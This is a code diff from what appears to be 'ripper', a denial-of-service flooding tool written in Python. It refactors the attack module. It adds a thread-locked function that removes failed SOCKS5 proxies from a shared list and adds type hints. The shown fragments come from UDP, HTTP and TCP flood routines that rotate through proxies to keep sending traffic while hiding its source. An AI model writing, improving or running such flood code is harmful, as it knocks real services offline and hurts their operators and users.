@@ -13,11 +13,12 @@ from ripper.common import get_random_string, get_server_ip_error_msg
 from ripper.proxy import Sock5Proxy
 from ripper.urllib_x import build_request_http_package, http_request
 
+lock = threading.Lock()
 
 ###############################################
 # Common methods for attacks
 ###############################################
-def build_ctx_request_http_package(_ctx, is_accept_header_only: bool = True) -> str:
+def build_ctx_request_http_package(_ctx: Context, is_accept_header_only: bool = True) -> str:
     local_headers = _ctx.headers
     if is_accept_header_only:
         local_headers = {
@@ -35,10 +36,19 @@ def build_ctx_request_http_package(_ctx, is_accept_header_only: bool = True) -> 
     )
 
 
-def random_proxy_from_context(_ctx) -> Sock5Proxy:
+def random_proxy_from_context(_ctx: Context) -> Sock5Proxy:
     if not _ctx.proxy_list or not len(_ctx.proxy_list):
         return None
     return random.choice(_ctx.proxy_list)
+
+
+def delete_proxy(_ctx: Context, proxy: Sock5Proxy):
+    lock.acquire()
+    is_exists = proxy in _ctx.proxy_list
+    if is_exists:
+        _ctx.proxy_list.remove(proxy)
+    lock.release()
+    return is_exists
 
 
 ###############################################
@@ -51,7 +61,7 @@ def down_it_udp(_ctx: Context):
         if proxy is None:
             proxy = random_proxy_from_context(_ctx)
             if proxy and not proxy.validate():
-                ripper.services.delete_proxy(_ctx, proxy)
+                delete_proxy(_ctx, proxy)
                 proxy = None
                 continue
         sock = _ctx.sock_manager.get_udp_socket(proxy)
@@ -91,7 +101,7 @@ def down_it_http(_ctx: Context):
             _ctx.http_codes_counter[response.status] += 1
             _ctx.connections_success += 1
         except socks.ProxyError:
-            ripper.services.delete_proxy(_ctx, proxy)
+            delete_proxy(_ctx, proxy)
             proxy = None
         except:
             _ctx.connections_failed += 1
@@ -124,7 +134,7 @@ def down_it_tcp(_ctx: Context):
                     if not _ctx.show_statistics:
                         show_statistics(_ctx)
         except socks.ProxyError:
-            ripper.services.delete_proxy(_ctx, proxy)
+            delete_proxy(_ctx, proxy)
             proxy = None
         except:
             _ctx.connections_failed += 1
